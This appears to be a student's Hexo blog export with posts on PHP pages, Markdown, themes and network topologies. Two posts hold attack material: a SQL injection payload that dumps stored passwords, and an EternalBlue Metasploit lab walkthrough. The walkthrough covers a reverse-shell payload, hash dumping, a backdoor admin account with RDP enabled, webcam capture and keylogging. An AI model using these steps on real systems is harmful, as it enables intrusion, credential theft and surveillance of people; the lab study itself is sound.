<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>完善主页功能并利用漏洞实现无密码登录</title>
    <link href="/2023/11/15/%E5%AE%8C%E5%96%84%E4%B8%BB%E9%A1%B5%E5%8A%9F%E8%83%BD%E5%B9%B6%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95/"/>
    <url>/2023/11/15/%E5%AE%8C%E5%96%84%E4%B8%BB%E9%A1%B5%E5%8A%9F%E8%83%BD%E5%B9%B6%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h3 id="美化index-php登录页面"><a href="#美化index-php登录页面" class="headerlink" title="美化index.php登录页面"></a>美化<em>index.php</em>登录页面</h3><p>利用<div>标签和<style>分别设置窗口的内容和格式</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-11-15_11-04-25.png" alt="Snipaste_2023-11-15_11-04-25"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-11-15_11-07-30.png" alt="Snipaste_2023-11-15_11-07-30"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">body&#123;&#125;  //设置body页面的属性background为设置背景图url为本根目录下的文件 background-repeat为设置背景是否重复  background-size为设置背景大小cover为覆盖页面<br>.login&#123;&#125;   //login为在div标签中创建的类<br>.flex1&#123;&#125;   //flex1为div标签创建的布置login的类<br>.login-top&#123;&#125;   //login-top是flex1中login页面的头部类<br><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2.png" alt="登录页面"></p><h3 id="使用sql注入实现免密码登录"><a href="#使用sql注入实现免密码登录" class="headerlink" title="使用sql注入实现免密码登录"></a>使用sql注入实现免密码登录</h3><p>在未对sql注入进行防范时将*1’ union select 1,database(),(group_concat(id,0x7e,username,0x7e,password)) from security.users– -*语句</p><p>输入在用户名的文本框里可以查询出<em>security</em>数据库中的<em>id,username,password</em>信息</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgsql%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F.png" alt="sql注入成功"></p><p>显示了需要的信息。</p><p>修改后的代码就无法注入成功。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84%E4%BB%A3%E7%A0%81.png" alt="修改后的代码"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%97%A0%E6%B3%95sql%E6%B3%A8%E5%85%A5.png" alt="无法sql注入"></p><h3 id="补全漏洞"><a href="#补全漏洞" class="headerlink" title="补全漏洞"></a>补全漏洞</h3><p>下图为上传文件和评论功能的截图</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%B8%8A%E4%BC%A0%E6%A1%86.png" alt="上传框"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%AF%84%E8%AE%BA.png" alt="评论"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$random_name</span> = <span class="hljs-title function_ invoke__">time</span>().<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$file_name</span>;   <span class="hljs-comment">//随时间随机生成文字在文件名前</span><br><span class="hljs-variable">$target_path</span> = <span class="hljs-variable">$upload_dir</span>.<span class="hljs-string">&quot;\\&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random_name</span>).<span class="hljs-variable">$file_name</span>;  <span class="hljs-comment">//将随机的文件名用MD5编码放置在upload文件根目录下</span><br><span class="hljs-variable">$comment</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;comment&#x27;</span>]); <span class="hljs-comment">// 使用htmlspecialchars语句防止 XSS 攻击</span><br><span class="hljs-variable">$comment</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$link</span>, <span class="hljs-variable">$comment</span>); <span class="hljs-comment">// 转义评论，防止 SQL 注入</span><br><br><br><br></code></pre></td></tr></table></figure><p>主页代码</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%B8%BB%E9%A1%B5%E4%BB%A3%E7%A0%81.png" alt="主页代码"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用php写页面</title>
    <link href="/2023/11/13/%E4%BD%BF%E7%94%A8php%E5%86%99%E9%A1%B5%E9%9D%A2/"/>
    <url>/2023/11/13/%E4%BD%BF%E7%94%A8php%E5%86%99%E9%A1%B5%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<h3 id="配置php环境"><a href="#配置php环境" class="headerlink" title="配置php环境"></a>配置php环境</h3><p>下载<em>phpstudy</em>，先更改php的版本为php5.5.9nts，再将网站中的目录索引打开。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgphpstudy.png" alt="phpstudy"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%94%B9php%E7%89%88%E6%9C%AC.png" alt="改php版本"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%B4%A2%E5%BC%95.png" alt="索引"></p><p>最后将<em>apache2.4.39和mysql5.7.26</em>启动就可应将写的php文件部署到本机了。</p><hr><h3 id="编写php网页"><a href="#编写php网页" class="headerlink" title="编写php网页"></a>编写php网页</h3><p>1.编写登录页面，新建文本文件将其重命名为<em>index.php</em>,输入！（英文）再输入回车将php页面格式化。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%A0%87%E5%87%86.png" alt="标准"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%A0%BC%E5%BC%8F%E5%8C%96php.png" alt="格式化php"></p><p>将body中填入所需的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;form method=<span class="hljs-string">&quot;post&quot;</span> action=<span class="hljs-string">&quot;link.php&quot;</span>&gt;  <span class="hljs-comment">//表单标签  method属性是表示传输方式 action属性表示传输的地址</span><br>&lt;title&gt;&lt;/title&gt;  <span class="hljs-comment">//title表示网页的名字</span><br>&lt;tr&gt;&lt;/tr&gt;  <span class="hljs-comment">//tr表示一个表格的一行</span><br>&lt;td&gt;&lt;/td&gt;  <span class="hljs-comment">//td表示一行中的一个</span><br>&lt;input type= name= value= &gt;&lt;/input&gt; <span class="hljs-comment">//input是表单中的输出元素 type表示类型 name表示名字 value表示值</span><br>&lt;br&gt;  <span class="hljs-comment">//br为换行标签</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>td1</th><th>td2</th></tr></thead><tbody><tr><td>td3</td><td>td4</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%99%BB%E5%BD%95%E9%A1%B5.png" alt="登录页"></p><p>2.编写链接页</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%BF%9E%E6%8E%A5%E9%A1%B5.png" alt="连接页"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-comment">//输出所接的语句</span><br>header <span class="hljs-comment">//进入页面</span><br>$ <span class="hljs-comment">//变量</span><br>trim   <span class="hljs-comment">//去除空格</span><br></code></pre></td></tr></table></figure><p>3.主页设置</p><p>设置登录成功界面信息。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%B8%BB%E9%A1%B5.png" alt="主页"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>利用永恒之蓝漏洞进入win7</title>
    <link href="/2023/11/11/%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E8%BF%9B%E5%85%A5win7/"/>
    <url>/2023/11/11/%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E8%BF%9B%E5%85%A5win7/</url>
    
    <content type="html"><![CDATA[<p>192.168.0.32（桥接机的地址）</p><h3 id="准备两台虚拟机“win7”和“kali-Linux”"><a href="#准备两台虚拟机“win7”和“kali-Linux”" class="headerlink" title="准备两台虚拟机“win7”和“kali Linux”"></a>准备两台虚拟机“win7”和“kali Linux”</h3><p>使用VMware新建两台虚拟机（win7和kali Linux），两台机器的网络适配器均设置为<strong>nat模式</strong><br>再开启指令运行器使用<em>ifcongfig</em>查看Linux系统的IP地址（192.168.73.130）<strong>注意： 需将win7的防火墙关闭，否则攻击可能失败。</strong></p><p>打开靶机（win7）命令处理程序（win+r，输入cmd），使用<em>ipconfig</em>查看靶机的IP地址（192.168.73.131）。</p><hr><h3 id="利用ms-17-010攻击靶机"><a href="#利用ms-17-010攻击靶机" class="headerlink" title="利用ms 17_010攻击靶机"></a>利用ms 17_010攻击靶机</h3><p>在Linux中运行指令（kali用户）msfconsole 进入msf</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231111153207384.png" alt="image-20231111153207384"></p><p>出现上图所示就表示msf启动成功。</p><p>进入msf后用search ms17_010查找可使用的msf模块，然后根据需要的模块使用功能如：<br>auxiliary模块(查看模块)，exploit模块（攻击模块）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgms17_010%E7%9A%84%E5%8A%9F%E8%83%BD.png" alt="ms17_010的功能"></p><p>使用use auxiliary语句选择auxiliary模块，使用show options展示本机的各项参数 ： </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgauxiliary%E6%A8%A1%E5%9D%97%E6%9F%A5%E7%9C%8B%E8%AE%BE%E7%BD%AE.png" alt="auxiliary模块查看设置"></p><p>再使用语句 <em>set rhosts 192.168.73.0&#x2F;24</em>扫描该网段的主机，使用<em>set threads 100</em> 设置扫描的速度（值越大速度越快），最后<em>run</em>执行扫描。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%89%AB%E6%8F%8F192.168.73.131%E7%9A%84%E9%9D%B6%E6%9C%BA.png" alt="扫描192.168.73.131的靶机"></p><p>寻找号可攻击的靶机后，use 0 使用攻击mokuai</p><p>设置攻击目标（靶机）：set rhost 192.168.100.128</p><p>设置监听主机（kali）：set lhost 192.168.100.100</p><p>设置攻击载荷：set payload  windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p><p>利用exploit进行攻击：run或者exploit</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231111162324402.png" alt="image-20231111162324402"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231111162355895.png" alt="image-20231111162355895"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB.png" alt="进行攻击"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F.png" alt="攻击成功"></p><p>显示“win”表示攻击成功，否则需查看之前的操作是否正确。</p><hr><h3 id="对靶机进行渗透"><a href="#对靶机进行渗透" class="headerlink" title="对靶机进行渗透"></a>对靶机进行渗透</h3><h4 id="1-使用sysinfo查询靶机信息"><a href="#1-使用sysinfo查询靶机信息" class="headerlink" title="1.使用sysinfo查询靶机信息"></a>1.使用<em>sysinfo</em>查询靶机信息</h4><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%98%BE%E7%A4%BA%E9%9D%B6%E6%9C%BA%E7%9A%84%E4%BF%A1%E6%81%AF.png" alt="显示靶机的信息"></p><p>使用<em>shell</em>获得管理员权限</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgshell%E6%8C%87%E4%BB%A4.png" alt="shell指令"></p><p>须知win系统和Linux系统的编码方式不同需要改变编码否者会出现乱码，使用以下指令更改编码方式： </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chcp</span> <span class="hljs-number">65001</span> //utf-<span class="hljs-number">8</span>编码<br><span class="hljs-attribute">chcp</span> <span class="hljs-number">936</span> //gbk编码<br></code></pre></td></tr></table></figure><h4 id="2-拍摄快照"><a href="#2-拍摄快照" class="headerlink" title="2.拍摄快照"></a>2.拍摄快照</h4><p>使用<em>exit</em>退出win7系统，在meterpreter使用<em>screenshot</em>拍摄靶机快照</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgscreenshot%E6%8B%8D%E6%91%84%E5%BF%AB%E7%85%A7.png" alt="screenshot拍摄快照"></p><p>然后在所在地址就可以找到快照。</p><h4 id="3-上传文件到靶机和下载靶机的文件"><a href="#3-上传文件到靶机和下载靶机的文件" class="headerlink" title="3.上传文件到靶机和下载靶机的文件"></a>3.上传文件到靶机和下载靶机的文件</h4><p>upload 要上传的文件路径（主机文件） 存储路径（靶机地址）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgupload.png" alt="upload"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%8E%A5%E6%94%B6.png" alt="接收"></p><p><strong>注意：windows系统不区分大小写而Linux系统会区分大小写，且路径文件名不要打错。</strong></p><p>download 下载文件路径（靶机文件） 存储文件地址（主机地址）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgdownload.png" alt="download"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%B8%8B%E8%BD%BD%E6%88%90%E5%8A%9F.png" alt="下载成功"></p><h4 id="4-获取靶机的账户和密码"><a href="#4-获取靶机的账户和密码" class="headerlink" title="4.获取靶机的账户和密码"></a>4.获取靶机的账户和密码</h4><p>利用刚拿到的<em>shell</em>执行权限提权，通过<em>shell</em>对靶机Win7进行控制</p><p>此时我们输入<em>getuid</em>查看权限得知权限为管理员权限</p><p>使用<em>shell</em>命令进入window7系统</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%8E%B7%E5%8F%96%E9%9D%B6%E6%9C%BA%E8%B4%A6%E6%88%B7%E5%92%8C%E5%AF%86%E7%A0%81%E7%9A%84%E5%93%88%E5%B8%8C%E5%80%BC.png" alt="获取靶机账户和密码的哈希值"></p><p>将哈希序列放在网站<a href="https://www.cmd5.com/">https://www.cmd5.com</a>上解析。</p><p>注：msf 在获取 shell 后为了更方便的进行渗透测试，可获取主机的 hash 以及域的 hash，即用户的密码，存在于 c 盘下的 windos 下的 system32 下的 config 下的 sam 文件中，以 hash 加密的方式存储，而系统开机后，hash 密码会以明文存在于内存中。</p><h4 id="5-新增靶机账户并远程登录靶机"><a href="#5-新增靶机账户并远程登录靶机" class="headerlink" title="5.新增靶机账户并远程登录靶机"></a>5.新增靶机账户并远程登录靶机</h4><p>使用<em>shell</em>命令进入window7系统，此时我们输入<em>getuid</em>查看权限得知权限为管理员权限</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">net user <span class="hljs-string">//</span>查看用户<br>net user 123 passwd <span class="hljs-string">/add</span> <span class="hljs-string">//</span>添加123用户并将密码设置成passwd<br>net localgroup administrators 123 <span class="hljs-string">/add</span> <span class="hljs-string">//</span>将123用户添加到administrators组（管理员），以提高123用户的权限<br>net user admin <span class="hljs-string">/active</span><span class="hljs-function">:yes</span>   <span class="hljs-string">//</span>开启远程管理服务<br>reg add<br><span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> <span class="hljs-string">/v</span> fDenyTSConnections <span class="hljs-string">/t</span> REG_DWORD <span class="hljs-string">/d</span> 0 <span class="hljs-string">/f</span>  <span class="hljs-string">//</span>在CMD命令行开启3389端口<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7.png" alt="查看用户"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231111173551295.png" alt="image-20231111173551295"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231111173600702.png" alt="image-20231111173600702"></p><h4 id="6-开启摄像头"><a href="#6-开启摄像头" class="headerlink" title="6.开启摄像头"></a>6.开启摄像头</h4><p>webcam_list –&gt;查看摄像头</p><p>webcam_snap –&gt;通过摄像头拍照</p><p>webcam_stream –&gt;通过摄像头开启视频</p><h4 id="7-键盘监听"><a href="#7-键盘监听" class="headerlink" title="7.键盘监听"></a>7.键盘监听</h4><p>ps 看（explorer.exe）进程号</p><p>migrate 1892（进程号） 迁移</p><p>keyscan_start 键盘监听</p><p>keyscan_dump 看键盘输入了什么</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>配置github的主题</title>
    <link href="/2023/11/09/%E9%85%8D%E7%BD%AEgithub%E7%9A%84%E4%B8%BB%E9%A2%98/"/>
    <url>/2023/11/09/%E9%85%8D%E7%BD%AEgithub%E7%9A%84%E4%B8%BB%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h3 id="选择hexo主题"><a href="#选择hexo主题" class="headerlink" title="选择hexo主题"></a>选择hexo主题</h3><p>在浏览器中搜索hexo主题，选择喜欢的主题。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imghexo%E4%B8%BB%E9%A2%98.png" alt="hexo主题"></p><p>下载所选择的主题的代码解压到博客的themes文件夹中，以fluid主题为例，在博客的根目录下git bash</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%8D%9A%E5%AE%A2git.png" alt="博客git"></p><p>执行命令</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-theme-fluid</span><br></code></pre></td></tr></table></figure><p>然后将解压的文件重命名为fluid，再如下修改 Hexo 博客目录中的 <code>_config.yml</code>：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theme:</span> fluid  <span class="hljs-meta"># 指定主题</span><br><br><span class="hljs-symbol">language:</span> <span class="hljs-built_in">zh</span>-CN  <span class="hljs-meta"># 指定语言，会影响主题显示的语言，按需修改</span><br></code></pre></td></tr></table></figure><p>最后部署在博客上就可以显示主题了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>markdown语法及网络的配置</title>
    <link href="/2023/11/08/markdown%E8%AF%AD%E6%B3%95%E5%8F%8A%E7%BD%91%E7%BB%9C%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
    <url>/2023/11/08/markdown%E8%AF%AD%E6%B3%95%E5%8F%8A%E7%BD%91%E7%BB%9C%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="Markdown语法"><a href="#Markdown语法" class="headerlink" title="Markdown语法"></a>Markdown语法</h1><h3 id="标题的大小"><a href="#标题的大小" class="headerlink" title="标题的大小"></a>标题的大小</h3><p>在Markdown语法中标题有6种大小并以#号作为区分，如： 一级标题就只有一个#，二级标题就有两个#号以此类推</p><h3 id="字体型号"><a href="#字体型号" class="headerlink" title="字体型号"></a>字体型号</h3><p>Markdown语法以字的左右两边的*号或_符号进行区分，其中两边各有一个为斜体——<em>斜体</em>，两边各有两个为粗体——<strong>粗体</strong> ，两边各有三个为粗斜体——<em><strong>粗斜体</strong></em> 。</p><h3 id="分格线"><a href="#分格线" class="headerlink" title="分格线"></a>分格线</h3><p>可以用三个或以上的***或___或在其中添加空格实现分格线。</p><hr><h3 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h3><p>在文字两边各两个~~号生成删除线，<del>删除线</del>。</p><h3 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h3><p>可使用HTML的&lt;u&gt;标签实现下划线，<u>下划线</u></p><h3 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h3><p>脚注使用[^github]打出，<a href="%E4%B8%80%E4%B8%AA%E5%BC%80%E6%BA%90%E7%9A%84%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0%E3%80%82">^github</a></p><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>Markdown 支持有序列表和无序列表。</p><p><strong>无序列表</strong>使用星号(<em>****)、加号(<strong>+</strong>)或是减号(</em>*-**)作为列表标记，这些标记后面要添加一个空格，然后再填写内容： </p><ul><li>一</li><li>二</li></ul><p><strong>有序列表</strong>使用数字并加上 <strong>.</strong> 号来表示，如： </p><ol><li>F</li><li>S</li></ol><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>如果是段落上的一个函数或片段的代码可以用反引号把它包起来（**&#96;**），例如： </p><p><code>printf()</code> 函数</p><p>你也可以用 <strong>&#96;&#96;&#96;</strong> 包裹一段代码，并指定一种语言（也可以不指定）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c+">printf(&quot;这是一条语句。&quot;)；<br></code></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>可以使用[链接名](链接地址)或&lt;链接地址&gt;直接表示链接，如： </p><p><a href="https://www.baidu.com/">百度</a>或<a href="http://www.baidu.com/">http://www.baidu.com</a></p><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p>可直接将图片托入Typora，再使用PicGo上传到github博客中。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgQQ%E6%88%AA%E5%9B%BE20231107200407.png"></p><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><p>使用|表头|表头|</p><p>​        |——|—–|</p><p>​         |        |      |</p><p>格式建立表格。</p><table><thead><tr><th>表头</th><th></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="转义文字"><a href="#转义文字" class="headerlink" title="转义文字"></a>转义文字</h3><p>如果需要显示特定的符号则需要使用转义字符，Markdown 使用反斜杠转义特殊字符： </p><p><strong>文本加粗</strong><br>** 正常显示星号 **</p><p>支持以下这些符号前面加上反斜杠来帮助插入普通的符号：  </p><p>\   反斜线<br>&#96;   反引号</p><ul><li><p>星号<br>_   下划线<br>{}  花括号<br>[]  方括号<br>()  小括号</p><p>#  井子号</p><p>+   加号</p><p>-    减号<br>.   英文句点<br>!   感叹号</p></li></ul><h3 id="PicGo的使用"><a href="#PicGo的使用" class="headerlink" title="PicGo的使用"></a>PicGo的使用</h3><p>配置PicGo</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgQQ%E6%88%AA%E5%9B%BE20231109093120.png" alt="QQ截图20231109093120"></p><p>其中图床配置名可以自由设置，设定仓库名必须配置“GitHub用户名\自己创建的库的名字”，设定分支名基本为main，设定Token需要打开github中的Settings，找到</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgscreenshot20231109.png" alt="screenshot20231109"></p><p>按如下操作： </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgscreenshot20231109%20(3).png" alt="screenshot20231109 (3)"></p><p>再选择<strong>无限时间</strong>，<strong>勾选repo</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgscreenshot20231109%20(5).png" alt="screenshot20231109 (5)"></p><hr><p>设定自定义域名格式（cdn）： <a href="https://cdn.jsdelivr.net/gh/%E4%BD%A0%E7%9A%84github%E7%94%A8%E6%88%B7%E5%90%8D/%E4%BD%A0%E7%9A%84%E4%BB%93%E5%BA%93%E5%90%8D@%E5%88%86%E6%94%AF%EF%BC%88%E4%B8%80%E8%88%AC%E4%B8%BAmain%EF%BC%89/">https://cdn.jsdelivr.net/gh/你的github用户名/你的仓库名@分支（一般为main）/</a></p><p>将设置都调整好后，点击保存。将图片上传到github上只需要将图片拖入Typora中在将点击上传图片即可。最后将Typora的文件<strong>部署</strong>到github上就可以在博客上看到图片了。</p><h1 id="网络的配置"><a href="#网络的配置" class="headerlink" title="网络的配置"></a>网络的配置</h1><h3 id="常见的网络拓扑结构"><a href="#常见的网络拓扑结构" class="headerlink" title="常见的网络拓扑结构"></a>常见的网络拓扑结构</h3><h3 id="1-总线型网络拓扑结构"><a href="#1-总线型网络拓扑结构" class="headerlink" title="1.总线型网络拓扑结构"></a>1.总线型网络拓扑结构</h3><p>总线型结构是将网络中的所有设备通过相应的硬件接口直接连接到公共总线上，结点之间按广播方式通信，一个结点发出的信息，总线上的其它结点均可“收听”到。 总线型结构就像一张树叶,有一条主干线,主干线上面由很多分支。总线型拓扑结构图如下: </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%80%BB%E7%BA%BF%E6%8B%93%E6%89%91.png" alt="总线拓扑"></p><p><strong>总线型拓扑结构的网络特点如下</strong>：</p><ul><li>结构简单，可扩充性好；</li><li>当需要增加节点时，只需要在总线上增加一个分支接口便可与分支节点相连，当总线负载不允许时还可以扩充总线；</li><li>使用的电缆少，且安装容易；</li><li>使用的设备相对简单，可靠性高；</li><li>维护难，分支节点故障查找难。</li></ul><p><strong>总线型拓扑结构的结构特点如下</strong>：</p><ul><li>组网费用低：从示意图可以这样的结构根本不需要另外的互联设备，是直接通过一条总线进行连接，所以组网费用较低；</li><li>这种网络因为各节点是共用总线带宽的，所以在传输速度上会随着接入网络的用户的增多而下降；</li><li>网络用户扩展较灵活：需要扩展用户时只需要添加一个接线器即可，但所能连接的用户数量有限；</li><li>维护较容易：单个节点失效不影响整个网络的正常通信。但是如果总线一断，则整个网络或者相应主干网段就断了。</li><li>这种网络拓扑结构的缺点是一次仅能一个端用户发送数据，其它端用户必须等待到获得发送权</li></ul><h3 id="2-星型网络拓扑结构"><a href="#2-星型网络拓扑结构" class="headerlink" title="2.星型网络拓扑结构"></a>2.星型网络拓扑结构</h3><p>星型结构是一种以中央节点为中心，把若干外围节点连接起来的辐射式互联结构。这种结构适用于局域网，特别是近年来连接的局域网大都采用这种连接方式。这种连接方式以双绞线或同轴电缆作连接线路。星型拓扑结构图如下: </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%98%9F%E5%9E%8B%E6%8B%93%E6%89%91.png" alt="星型拓扑"></p><p><strong>星型拓扑结构的结构特点如下</strong>：</p><ul><li>控制简单。任何一站点只和中央节点相连接，因而介质访问控制方法简单，致使访问协议也十分简单。易于网络监控和管理。</li><li>故障诊断和隔离容易。中央节点对连接线路可以逐一隔离进行故障检测和定位，单个连接点的故障只影响一个设备，不会影响全网。</li><li>方便服务。中央节点可以方便地对各个站点提供服务和网络重新配置。</li></ul><p>总的来说星型拓扑结构相对简单，便于管理，建网容易，是目前局域网普采用的一种拓扑结构。采用星型拓扑结构的局域网，一般使用双绞线或光纤作为传输介质，符合综合布线标准，能够满足多种宽带需求。</p><p>尽管物理星型拓扑的实施费用高于物理总线拓扑，然而星型拓扑的优势却使其物超所值。每台设备通过各自的线缆连接到中心设备，因此某根电缆出现问题时只会影响到那一台设备，而网络的其他组件依然可正常运行。这个优点极其重要，这也正是所有新设计的以太网都采用的物理星型拓扑的原因所在。</p><h3 id="3-环形网络拓扑结构"><a href="#3-环形网络拓扑结构" class="headerlink" title="3.环形网络拓扑结构"></a>3.环形网络拓扑结构</h3><p>环形结构各结点通过通信线路组成闭合回路，环中数据只能单向传输，信息在每台设备上的延时时间是固定的，特别适合实时控制的局域网系统。环形结构就如一串珍珠项链,环形结构上的每台计算机就是项链上的一个个珠子。环形拓扑结构图如下:</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%8E%AF%E5%BD%A2%E6%8B%93%E6%89%91.png" 